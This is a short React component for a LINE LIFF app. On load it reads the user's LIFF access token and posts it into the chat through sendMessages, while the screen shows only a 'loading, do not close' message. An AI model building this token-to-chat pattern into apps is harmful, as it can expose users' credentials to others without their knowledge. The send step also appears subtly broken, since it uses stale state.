import { useState, useEffect } from "react";
import { getLiffId } from "@/utils/getLiffId";

import { liff } from "@line/liff"; 

export default function Token() {
  const [liffObj, setLiffObj] = useState<any>({});
  const [token, setToken] = useState("");

  useEffect(() => {
    liff.init({ liffId: getLiffId() }).then(() => {
      setLiffObj(liff);
      console.log("Patch!");
      console.log(liff);
      setToken(liff.getAccessToken() || "");
      liff.sendMessages([{
        "type": "text",
        "text": "- Token -"
      },{
        "type": "text",
        "text": token
      }]).catch(e => {
        alert("Error: " + e)
      }) 
    })
  }, [])
 

  return (
    <>
      <p>読み込み中・・・ (読み込み中に画面を閉じないでください。)</p>
    </>
  );
}

